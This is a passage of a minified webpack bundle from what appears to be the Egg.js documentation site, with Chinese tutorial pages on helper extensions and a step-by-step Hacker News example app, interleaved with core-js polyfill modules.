",r.a.createElement("code",null,"helper")," \u5bf9\u8c61\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u589e\u52a0\u4e00\u4e2a ",r.a.createElement("code",null,"helper.foo()")," \u65b9\u6cd5\uff1a"),r.a.createElement(o["a"],{code:"// app/extend/helper.js\nmodule.exports = {\n  foo(param) {\n    // this \u662f helper \u5bf9\u8c61\uff0c\u5728\u5176\u4e2d\u53ef\u4ee5\u8c03\u7528\u5176\u4ed6 helper \u65b9\u6cd5\n    // this.ctx => context \u5bf9\u8c61\n    // this.app => application \u5bf9\u8c61\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"\u6309\u7167\u73af\u5883\u8fdb\u884c\u6269\u5c55"},r.a.createElement(l["AnchorLink"],{to:"#\u6309\u7167\u73af\u5883\u8fdb\u884c\u6269\u5c55","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6309\u7167\u73af\u5883\u8fdb\u884c\u6269\u5c55"),r.a.createElement("p",null,"\u53e6\u5916\uff0c\u8fd8\u53ef\u4ee5\u6839\u636e\u73af\u5883\u8fdb\u884c\u6709\u9009\u62e9\u7684\u6269\u5c55\uff0c\u4f8b\u5982\uff0c\u53ea\u5728 unittest \u73af\u5883\u4e2d\u63d0\u4f9b ",r.a.createElement("code",null,"mockXX()")," \u65b9\u6cd5\u4ee5\u4fbf\u8fdb\u884c mock \u65b9\u4fbf\u6d4b\u8bd5\u3002"),r.a.createElement(o["a"],{code:"// app/extend/application.unittest.js\nmodule.exports = {\n  mockXX(k, v) {},\n};",lang:"js"}),r.a.createElement("p",null,"\u8fd9\u4e2a\u6587\u4ef6\u53ea\u4f1a\u5728 unittest \u73af\u5883\u52a0\u8f7d\u3002"),r.a.createElement("p",null,"\u540c\u7406\uff0c\u5bf9\u4e8e Application\uff0cContext\uff0cRequest\uff0cResponse\uff0cHelper \u90fd\u53ef\u4ee5\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u9488\u5bf9\u67d0\u4e2a\u73af\u5883\u8fdb\u884c\u6269\u5c55\uff0c\u66f4\u591a\u53c2\u89c1",r.a.createElement(l["Link"],{to:"./env"},"\u8fd0\u884c\u73af\u5883"),"\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},JAZO:function(e,t,n){var a=n("AaXQ"),r=n("KeQb");e.exports=function(e,t){var n=e.exec;if("function"===typeof n){var l=n.call(e,t);if("object"!==typeof l)throw TypeError("RegExp exec method returned something other than an Object or null");return l}if("RegExp"!==a(e))throw TypeError("RegExp#exec called on incompatible receiver");return r.call(e,t)}},"JH4+":function(e,t,n){"use strict";e.exports=function(){var e=arguments.length,t=new Array(e);while(e--)t[e]=arguments[e];return new this(t)}},JHkF:function(e,t){var n=Math.log;e.exports=Math.log1p||function(e){return(e=+e)>-1e-8&&e<1e-8?e-e*e/2:n(1+e)}},JXBY:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("BZjo"),i=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{join:function(e){var t=l(this),n=o(t),a=void 0===e?",":String(e),r=[];return i(n,r.push,r,!1,!0),r.join(a)}})},Jdqy:function(e,t,n){"use strict";var a="SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED";e.exports=a},JfFA:function(e,t,n){var a,r,l,o,i,c,s,u,d=n("A0UU"),m=n("vr25").f,p=n("AaXQ"),h=n("HvYB").set,g=n("Yu9L"),f=d.MutationObserver||d.WebKitMutationObserver,E=d.process,b=d.Promise,v="process"==p(E),y=m(d,"queueMicrotask"),k=y&&y.value;k||(a=function(){var e,t;v&&(e=E.domain)&&e.exit();while(r){t=r.fn,r=r.next;try{t()}catch(n){throw r?o():l=void 0,n}}l=void 0,e&&e.enter()},v?o=function(){E.nextTick(a)}:f&&!g?(i=!0,c=document.createTextNode(""),new f(a).observe(c,{characterData:!0}),o=function(){c.data=i=!i}):b&&b.resolve?(s=b.resolve(void 0),u=s.then,o=function(){u.call(s,a)}):o=function(){h.call(d,a)}),e.exports=k||function(e){var t={fn:e,next:void 0};l&&(l.next=t),r||(r=t,o()),l=t}},JnuT:function(e,t,n){var a=n("0mt+"),r=n("RcAc"),l=n("7un0"),o=n("oyD1"),i=n("Yftc"),c=n("NBU9"),s=l.keys,u=l.toKey,d=function(e){var t=[];return c(e,t.push,t),t},m=function(e,t){var n=s(e,t),a=i(e);if(null===a)return n;var l=m(a,t);return l.length?n.length?d(new r(n.concat(l))):l:n};a({target:"Reflect",stat:!0},{getMetadataKeys:function(e){var t=arguments.length<2?void 0:u(arguments[1]);return m(o(e),t)}})},"Jx+A":function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("XaNN"),i=n("AOzO"),c=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{reduce:function(e){var t=l(this),n=i(t),a=arguments.length<2,r=a?void 0:arguments[1];if(o(e),c(n,(function(n,l){a?(a=!1,r=l):r=e(r,l,n,t)}),void 0,!0,!0),a)throw TypeError("Reduce of empty map with no initial value");return r}})},JyiG:function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var a=n("310B"),r=n("EZPA"),l=(0,r.LinkWrapper)(a.NavLink);t["default"]=l},KFTt:function(e,t,n){"use strict";e.exports=function e(t,n){if(t===n)return!0;if(t&&n&&"object"==typeof t&&"object"==typeof n){if(t.constructor!==n.constructor)return!1;var a,r,l;if(Array.isArray(t)){if(a=t.length,a!=n.length)return!1;for(r=a;0!==r--;)if(!e(t[r],n[r]))return!1;return!0}if(t.constructor===RegExp)return t.source===n.source&&t.flags===n.flags;if(t.valueOf!==Object.prototype.valueOf)return t.valueOf()===n.valueOf();if(t.toString!==Object.prototype.toString)return t.toString()===n.toString();if(l=Object.keys(t),a=l.length,a!==Object.keys(n).length)return!1;for(r=a;0!==r--;)if(!Object.prototype.hasOwnProperty.call(n,l[r]))return!1;for(r=a;0!==r--;){var o=l[r];if(!e(t[o],n[o]))return!1}return!0}return t!==t&&n!==n}},KKLt:function(e,t,n){var a=n("0mt+"),r=n("JH4+");a({target:"WeakSet",stat:!0},{of:r})},KLR4:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u672c\u6587\u5c06\u4ece\u5b9e\u4f8b\u7684\u89d2\u5ea6\uff0c\u4e00\u6b65\u6b65\u5730\u642d\u5efa\u51fa\u4e00\u4e2a Egg.js \u5e94\u7528\uff0c\u8ba9\u4f60\u80fd\u5feb\u901f\u7684\u5165\u95e8 Egg.js\u3002"),r.a.createElement("h2",{id:"\u73af\u5883\u51c6\u5907"},r.a.createElement(l["AnchorLink"],{to:"#\u73af\u5883\u51c6\u5907","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u73af\u5883\u51c6\u5907"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u64cd\u4f5c\u7cfb\u7edf\uff1a\u652f\u6301 macOS\uff0cLinux\uff0cWindows"),r.a.createElement("li",null,"\u8fd0\u884c\u73af\u5883\uff1a\u5efa\u8bae\u9009\u62e9 ",r.a.createElement(l["Link"],{to:"http://nodejs.org/"},"LTS \u7248\u672c"),"\uff0c\u6700\u4f4e\u8981\u6c42 8.x\u3002")),r.a.createElement("h2",{id:"\u5feb\u901f\u521d\u59cb\u5316"},r.a.createElement(l["AnchorLink"],{to:"#\u5feb\u901f\u521d\u59cb\u5316","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5feb\u901f\u521d\u59cb\u5316"),r.a.createElement("p",null,"\u6211\u4eec\u63a8\u8350\u76f4\u63a5\u4f7f\u7528\u811a\u624b\u67b6\uff0c\u53ea\u9700\u51e0\u6761\u7b80\u5355\u6307\u4ee4\uff0c\u5373\u53ef\u5feb\u901f\u751f\u6210\u9879\u76ee\uff08",r.a.createElement("code",null,"npm >=6.1.0"),"\uff09:"),r.a.createElement(o["a"],{code:"$ mkdir egg-example && cd egg-example\n$ npm init egg --type=simple\n$ npm i",lang:"bash"}),r.a.createElement("p",null,"\u542f\u52a8\u9879\u76ee:"),r.a.createElement(o["a"],{code:"$ npm run dev\n$ open http://localhost:7001",lang:"bash"}),r.a.createElement("h2",{id:"\u9010\u6b65\u642d\u5efa"},r.a.createElement(l["AnchorLink"],{to:"#\u9010\u6b65\u642d\u5efa","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9010\u6b65\u642d\u5efa"),r.a.createElement("p",null,"\u901a\u5e38\u4f60\u53ef\u4ee5\u901a\u8fc7\u4e0a\u4e00\u8282\u7684\u65b9\u5f0f\uff0c\u4f7f\u7528 ",r.a.createElement("code",null,"npm init egg")," \u5feb\u901f\u9009\u62e9\u9002\u5408\u5bf9\u5e94\u4e1a\u52a1\u6a21\u578b\u7684\u811a\u624b\u67b6\uff0c\u5feb\u901f\u542f\u52a8 Egg.js \u9879\u76ee\u7684\u5f00\u53d1\u3002"),r.a.createElement("p",null,"\u4f46\u4e3a\u4e86\u8ba9\u5927\u5bb6\u66f4\u597d\u7684\u4e86\u89e3 Egg.js\uff0c\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c06\u8df3\u8fc7\u811a\u624b\u67b6\uff0c\u624b\u52a8\u4e00\u6b65\u6b65\u7684\u642d\u5efa\u51fa\u4e00\u4e2a ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/hackernews"},"Hacker News"),"\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u5b9e\u9645\u9879\u76ee\u4e2d\uff0c\u6211\u4eec\u63a8\u8350\u4f7f\u7528\u4e0a\u4e00\u8282\u7684\u811a\u624b\u67b6\u76f4\u63a5\u521d\u59cb\u5316\u3002")),r.a.createElement("p",null,r.a.createElement("img",{src:"https://cloud.githubusercontent.com/assets/227713/22960991/812999bc-f37d-11e6-8bd5-a96ca37d0ff2.png",alt:"Egg HackerNews Snapshoot"})),r.a.createElement("h3",{id:"\u521d\u59cb\u5316\u9879\u76ee"},r.a.createElement(l["AnchorLink"],{to:"#\u521d\u59cb\u5316\u9879\u76ee","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u521d\u59cb\u5316\u9879\u76ee"),r.a.createElement("p",null,"\u5148\u6765\u521d\u59cb\u5316\u4e0b\u76ee\u5f55\u7ed3\u6784\uff1a"),r.a.createElement(o["a"],{code:"$ mkdir egg-example\n$ cd egg-example\n$ npm init\n$ npm i egg --save\n$ npm i egg-bin --save-dev",lang:"bash"}),r.a.createElement("p",null,"\u6dfb\u52a0 ",r.a.createElement("code",null,"npm scripts")," \u5230 ",r.a.createElement("code",null,"package.json"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "name": "egg-example",\n  "scripts": {\n    "dev": "egg-bin dev"\n  }\n}',lang:"json"}),r.a.createElement("h3",{id:"\u7f16\u5199-controller"},r.a.createElement(l["AnchorLink"],{to:"#\u7f16\u5199-controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f16\u5199 Controller"),r.a.createElement("p",null,"\u5982\u679c\u4f60\u719f\u6089 Web \u5f00\u53d1\u6216 MVC\uff0c\u80af\u5b9a\u731c\u5230\u6211\u4eec\u7b2c\u4e00\u6b65\u9700\u8981\u7f16\u5199\u7684\u662f ",r.a.createElement(l["Link"],{to:"../basics/controller"},"Controller")," \u548c ",r.a.createElement(l["Link"],{to:"../basics/router"},"Router"),"\u3002"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nconst Controller = require('egg').Controller;\n\nclass HomeController extends Controller {\n  async index() {\n    this.ctx.body = 'Hello world';\n  }\n}\n\nmodule.exports = HomeController;",lang:"js"}),r.a.createElement("p",null,"\u914d\u7f6e\u8def\u7531\u6620\u5c04\uff1a"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('/', controller.home.index);\n};",lang:"js"}),r.a.createElement("p",null,"\u52a0\u4e00\u4e2a",r.a.createElement(l["Link"],{to:"../basics/config"},"\u914d\u7f6e\u6587\u4ef6"),"\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.keys = <\u6b64\u5904\u6539\u4e3a\u4f60\u81ea\u5df1\u7684 Cookie \u5b89\u5168\u5b57\u7b26\u4e32>;",lang:"js"}),r.a.createElement("p",null,"\u6b64\u65f6\u76ee\u5f55\u7ed3\u6784\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"egg-example\n\u251c\u2500\u2500 app\n\u2502   \u251c\u2500\u2500 controller\n\u2502   \u2502   \u2514\u2500\u2500 home.js\n\u2502   \u2514\u2500\u2500 router.js\n\u251c\u2500\u2500 config\n\u2502   \u2514\u2500\u2500 config.default.js\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("p",null,"\u5b8c\u6574\u7684\u76ee\u5f55\u7ed3\u6784\u89c4\u8303\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../basics/structure"},"\u76ee\u5f55\u7ed3\u6784"),"\u3002"),r.a.createElement("p",null,"\u597d\uff0c\u73b0\u5728\u53ef\u4ee5\u542f\u52a8\u5e94\u7528\u6765\u4f53\u9a8c\u4e0b"),r.a.createElement(o["a"],{code:"$ npm run dev\n$ open http://localhost:7001",lang:"bash"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u6ce8\u610f\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"Controller \u6709 ",r.a.createElement("code",null,"class")," \u548c ",r.a.createElement("code",null,"exports")," \u4e24\u79cd\u7f16\u5199\u65b9\u5f0f\uff0c\u672c\u6587\u793a\u8303\u7684\u662f\u524d\u8005\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"../basics/controller"},"Controller")," \u6587\u6863\u3002"),r.a.createElement("li",null,"Config \u4e5f\u6709 ",r.a.createElement("code",null,"module.exports")," \u548c ",r.a.createElement("code",null,"exports")," \u7684\u5199\u6cd5\uff0c\u5177\u4f53\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/modules.html#modules_exports_shortcut"},"Node.js modules \u6587\u6863"),"\u3002"))),r.a.createElement("h3",{id:"\u9759\u6001\u8d44\u6e90"},r.a.createElement(l["AnchorLink"],{to:"#\u9759\u6001\u8d44\u6e90","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9759\u6001\u8d44\u6e90"),r.a.createElement("p",null,"Egg \u5185\u7f6e\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-static"},"static")," \u63d2\u4ef6\uff0c\u7ebf\u4e0a\u73af\u5883\u5efa\u8bae\u90e8\u7f72\u5230 CDN\uff0c\u65e0\u9700\u8be5\u63d2\u4ef6\u3002"),r.a.createElement("p",null,"static \u63d2\u4ef6\u9ed8\u8ba4\u6620\u5c04 ",r.a.createElement("code",null,"/public/* -> app/public/*")," \u76ee\u5f55"),r.a.createElement("p",null,"\u6b64\u5904\uff0c\u6211\u4eec\u628a\u9759\u6001\u8d44\u6e90\u90fd\u653e\u5230 ",r.a.createElement("code",null,"app/public")," \u76ee\u5f55\u5373\u53ef\uff1a"),r.a.createElement(o["a"],{code:"app/public\n\u251c\u2500\u2500 css\n\u2502   \u2514\u2500\u2500 news.css\n\u2514\u2500\u2500 js\n    \u251c\u2500\u2500 lib.js\n    \u2514\u2500\u2500 news.js",lang:"bash"}),r.a.createElement("h3",{id:"\u6a21\u677f\u6e32\u67d3"},r.a.createElement(l["AnchorLink"],{to:"#\u6a21\u677f\u6e32\u67d3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6a21\u677f\u6e32\u67d3"),r.a.createElement("p",null,"\u7edd\u5927\u591a\u6570\u60c5\u51b5\uff0c\u6211\u4eec\u90fd\u9700\u8981\u8bfb\u53d6\u6570\u636e\u540e\u6e32\u67d3\u6a21\u677f\uff0c\u7136\u540e\u5448\u73b0\u7ed9\u7528\u6237\u3002\u6545\u6211\u4eec\u9700\u8981\u5f15\u5165\u5bf9\u5e94\u7684\u6a21\u677f\u5f15\u64ce\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5e76\u4e0d\u5f3a\u5236\u4f60\u4f7f\u7528\u67d0\u79cd\u6a21\u677f\u5f15\u64ce\uff0c\u53ea\u662f\u7ea6\u5b9a\u4e86 ",r.a.createElement(l["Link"],{to:"../advanced/view-plugin"},"View \u63d2\u4ef6\u5f00\u53d1\u89c4\u8303"),"\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u5f15\u5165\u4e0d\u540c\u7684\u63d2\u4ef6\u6765\u5b9e\u73b0\u5dee\u5f02\u5316\u5b9a\u5236\u3002"),r.a.createElement("p",null,"\u66f4\u591a\u7528\u6cd5\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"../core/view"},"View"),"\u3002"),r.a.createElement("p",null,"\u5728\u672c\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://mozilla.github.io/nunjucks/"},"Nunjucks")," \u6765\u6e32\u67d3\uff0c\u5148\u5b89\u88c5\u5bf9\u5e94\u7684\u63d2\u4ef6 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks")," \uff1a"),r.a.createElement(o["a"],{code:"$ npm i egg-view-nunjucks --save",lang:"bash"}),r.a.createElement("p",null,"\u5f00\u542f\u63d2\u4ef6\uff1a"),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.nunjucks = {\n  enable: true,\n  package: 'egg-view-nunjucks',\n};",lang:"js"}),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.keys = <\u6b64\u5904\u6539\u4e3a\u4f60\u81ea\u5df1\u7684 Cookie \u5b89\u5168\u5b57\u7b26\u4e32>;\n// \u6dfb\u52a0 view \u914d\u7f6e\nexports.view = {\n  defaultViewEngine: 'nunjucks',\n  mapping: {\n    '.tpl': 'nunjucks',\n  },\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u662f ",r.a.createElement("code",null,"config")," \u76ee\u5f55\uff0c\u4e0d\u662f ",r.a.createElement("code",null,"app/config"),"!")),r.a.createElement("p",null,"\u4e3a\u5217\u8868\u9875\u7f16\u5199\u6a21\u677f\u6587\u4ef6\uff0c\u4e00\u822c\u653e\u7f6e\u5728 ",r.a.createElement("code",null,"app/view")," \u76ee\u5f55\u4e0b"),r.a.createElement(o["a"],{code:'\x3c!-- app/view/news/list.tpl --\x3e\n<html>\n  <head>\n    <title>Hacker News</title>\n    <link rel="stylesheet" href="/public/css/news.css" />\n  </head>\n  <body>\n    <ul class="news-view view">\n      {% for item in list %}\n      <li class="item">\n        <a href="{{ item.url }}">{{ item.title }}</a>\n      </li>\n      {% endfor %}\n    </ul>\n  </body>\n</html>',lang:"html"}),r.a.createElement("p",null,"\u6dfb\u52a0 Controller \u548c Router"),r.a.createElement(o["a"],{code:"// app/controller/news.js\nconst Controller = require('egg').Controller;\n\nclass NewsController extends Controller {\n  async list() {\n    const dataList = {\n      list: [\n        { id: 1, title: 'this is news 1', url: '/news/1' },\n        { id: 2, title: 'this is news 2', url: '/news/2' },\n      ],\n    };\n    await this.ctx.render('news/list.tpl', dataList);\n  }\n}\n\nmodule.exports = NewsController;\n\n// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('/', controller.home.index);\n  router.get('/news', controller.news.list);\n};",lang:"js"}),r.a.createElement("p",null,"\u542f\u52a8\u6d4f\u89c8\u5668\uff0c\u8bbf\u95ee ",r.a.createElement(l["Link"],{to:"http://localhost:7001/news"},"http://localhost:7001/news")," \u5373\u53ef\u770b\u5230\u6e32\u67d3\u540e\u7684\u9875\u9762\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u63d0\u793a\uff1a\u5f00\u53d1\u671f\u9ed8\u8ba4\u5f00\u542f\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-development"},"development")," \u63d2\u4ef6\uff0c\u4fee\u6539\u540e\u7aef\u4ee3\u7801\u540e\uff0c\u4f1a\u81ea\u52a8\u91cd\u542f Worker \u8fdb\u7a0b\u3002")),r.a.createElement("h3",{id:"\u7f16\u5199-service"},r.a.createElement(l["AnchorLink"],{to:"#\u7f16\u5199-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f16\u5199 service"),r.a.createElement("p",null,"\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0cController \u4e00\u822c\u4e0d\u4f1a\u81ea\u5df1\u4ea7\u51fa\u6570\u636e\uff0c\u4e5f\u4e0d\u4f1a\u5305\u542b\u590d\u6742\u7684\u903b\u8f91\uff0c\u590d\u6742\u7684\u8fc7\u7a0b\u5e94\u62bd\u8c61\u4e3a\u4e1a\u52a1\u903b\u8f91\u5c42 ",r.a.createElement(l["Link"],{to:"../basics/service"},"Service"),"\u3002"),r.a.createElement("p",null,"\u6211\u4eec\u6765\u6dfb\u52a0\u4e00\u4e2a Service \u6293\u53d6 ",r.a.createElement(l["Link"],{to:"https://github.com/HackerNews/API"},"Hacker News")," \u7684\u6570\u636e \uff0c\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"// app/service/news.js\nconst Service = require('egg').Service;\n\nclass NewsService extends Service {\n  async list(page = 1) {\n    // read config\n    const { serverUrl, pageSize } = this.config.news;\n\n    // use build-in http client to GET hacker-news api\n    const { data: idList } = await this.ctx.curl(\n      `${serverUrl}/topstories.json`,\n      {\n        data: {\n          orderBy: '\"$key\"',\n          startAt: `\"${pageSize * (page - 1)}\"`,\n          endAt: `\"${pageSize * page - 1}\"`,\n        },\n        dataType: 'json',\n      },\n    );\n\n    // parallel GET detail\n    const newsList = await Promise.all(\n      Object.keys(idList).map((key) => {\n        const url = `${serverUrl}/item/${idList[key]}.json`;\n        return this.ctx.curl(url, { dataType: 'json' });\n      }),\n    );\n    return newsList.map((res) => res.data);\n  }\n}\n\nmodule.exports = NewsService;",lang:"js"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u5185\u7f6e\u7684 ",r.a.createElement(l["Link"],{to:"../core/httpclient"},"HttpClient")," \u6765\u65b9\u4fbf\u5f00\u53d1\u8005\u4f7f\u7528 HTTP \u8bf7\u6c42\u3002")),r.a.createElement("p",null,"\u7136\u540e\u7a0d\u5fae\u4fee\u6539\u4e0b\u4e4b\u524d\u7684 Controller\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/news.js\nconst Controller = require('egg').Controller;\n\nclass NewsController extends Controller {\n  async list() {\n    const ctx = this.ctx;\n    const page = ctx.query.page || 1;\n    const newsList = await ctx.service.news.list(page);\n    await ctx.render('news/list.tpl', { list: newsList });\n  }\n}\n\nmodule.exports = NewsController;",lang:"js"}),r.a.createElement("p",null,"\u8fd8\u9700\u589e\u52a0 ",r.a.createElement("code",null,"app/service/news.js")," \u4e2d\u8bfb\u53d6\u5230\u7684\u914d\u7f6e\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\n// \u6dfb\u52a0 news \u7684\u914d\u7f6e\u9879\nexports.news = {\n  pageSize: 5,\n  serverUrl: 'https://hacker-news.firebaseio.com/v0',\n};",lang:"js"}),r.a.createElement("h3",{id:"\u7f16\u5199\u6269\u5c55"},r.a.createElement(l["AnchorLink"],{to:"#\u7f16\u5199\u6269\u5c55","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f16\u5199\u6269\u5c55"),r.a.createElement("p",null,"\u9047\u5230\u4e00\u4e2a\u5c0f\u95ee\u9898\uff0c\u6211\u4eec\u7684\u8d44\u8baf\u65f6\u95f4\u7684\u6570\u636e\u662f UnixTime \u683c\u5f0f\u7684\uff0c\u6211\u4eec\u5e0c\u671b\u663e\u793a\u4e3a\u4fbf\u4e8e\u9605\u8bfb\u7684\u683c\u5f0f\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u4e00\u79cd\u5feb\u901f\u6269\u5c55\u7684\u65b9\u5f0f\uff0c\u53ea\u9700\u5728 ",r.a.createElement("code",null,"app/extend")," \u76ee\u5f55\u4e0b\u63d0\u4f9b\u6269\u5c55\u811a\u672c\u5373\u53ef\uff0c\u5177\u4f53\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../basics/extend"},"\u6269\u5c55"),"\u3002"),r.a.createElement("p",null,"\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 View \u63d2\u4ef6\u652f\u6301\u7684 Helper \u6765\u5b9e\u73b0\uff1a"),r.a.createElement(o["a"],{code:"$ npm i moment --save",lang:"bash"}),r.a.createElement(o["a"],{code:"// app/extend/helper.js\nconst moment = require('moment');\nexports.relativeTime = (time) => moment(new Date(time * 1000)).fromNow();",lang:"js"}),r.a.createElement("p",null,"\u5728\u6a21\u677f\u91cc\u9762\u4f7f\u7528\uff1a"),r.a.createElement(o["a"],{code:"\x3c!-- app/view/news/list.tpl --\x3e\n{{ helper.relativeTime(item.time) }}",lang:"html"}),r.a.createElement("h3",{id:"\u7f16\u5199-middleware"},r.a.createElement(l["AnchorLink"],{to:"#\u7f16\u5199-middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f16\u5199 Middleware"),r.a.createElement("p",null,"\u5047\u8bbe\u6709\u4e2a\u9700\u6c42\uff1a\u6211\u4eec\u7684\u65b0\u95fb\u7ad9\u70b9\uff0c\u7981\u6b62\u767e\u5ea6\u722c\u866b\u8bbf\u95ee\u3002"),r.a.createElement("p",null,"\u806a\u660e\u7684\u540c\u5b66\u4eec\u4e00\u5b9a\u5f88\u5feb\u80fd\u60f3\u5230\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"../basics/middleware"},"Middleware")," \u5224\u65ad User-Agent\uff0c\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"// app/middleware/robot.js\n// options === app.config.robot\nmodule.exports = (options, app) => {\n  return async function robotMiddleware(ctx, next) {\n    const source = ctx.get('user-agent') || '';\n    const match = options.ua.some((ua) => ua.test(source));\n    if (match) {\n      ctx.status = 403;\n      ctx.message = 'Go away, robot.';\n    } else {\n      await next();\n    }\n  };\n};\n\n// config/config.default.js\n// add middleware robot\nexports.middleware = ['robot'];\n// robot's configurations\nexports.robot = {\n  ua: [/Baiduspider/i],\n};",lang:"js"}),r.a.createElement("p",null,"\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528 ",r.a.createElement("code",null,'curl http://localhost:7001/news -A "Baiduspider"')," \u770b\u770b\u6548\u679c\u3002"),r.a.createElement("p",null,"\u66f4\u591a\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../basics/middleware"},"\u4e2d\u95f4\u4ef6"),"\u6587\u6863\u3002"),r.a.createElement("h3",{id:"\u914d\u7f6e\u6587\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e\u6587\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e\u6587\u4ef6"),r.a.createElement("p",null,"\u5199\u4e1a\u52a1\u7684\u65f6\u5019\uff0c\u4e0d\u53ef\u907f\u514d\u7684\u9700\u8981\u6709\u914d\u7f6e\u6587\u4ef6\uff0c\u6846\u67b6\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u914d\u7f6e\u5408\u5e76\u7ba1\u7406\u529f\u80fd\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u652f\u6301\u6309\u73af\u5883\u53d8\u91cf\u52a0\u8f7d\u4e0d\u540c\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5982 ",r.a.createElement("code",null,"config.local.js"),"\uff0c ",r.a.createElement("code",null,"config.prod.js")," \u7b49\u7b49\u3002"),r.a.createElement("li",null,"\u5e94\u7528/\u63d2\u4ef6/\u6846\u67b6\u90fd\u53ef\u4ee5\u914d\u7f6e\u81ea\u5df1\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u6846\u67b6\u5c06\u6309\u987a\u5e8f\u5408\u5e76\u52a0\u8f7d\u3002"),r.a.createElement("li",null,"\u5177\u4f53\u5408\u5e76\u903b\u8f91\u53ef\u53c2\u89c1",r.a.createElement(l["AnchorLink"],{to:"../basics/config#%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F"},"\u914d\u7f6e\u6587\u4ef6"),"\u3002")),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.robot = {\n  ua: [/curl/i, /Baiduspider/i],\n};\n\n// config/config.local.js\n// only read at development mode, will override default\nexports.robot = {\n  ua: [/Baiduspider/i],\n};\n\n// app/service/some.js\nconst Service = require('egg').Service;\n\nclass SomeService extends Service {\n  async list() {\n    const rule = this.config.robot.ua;\n  }\n}\n\nmodule.exports = 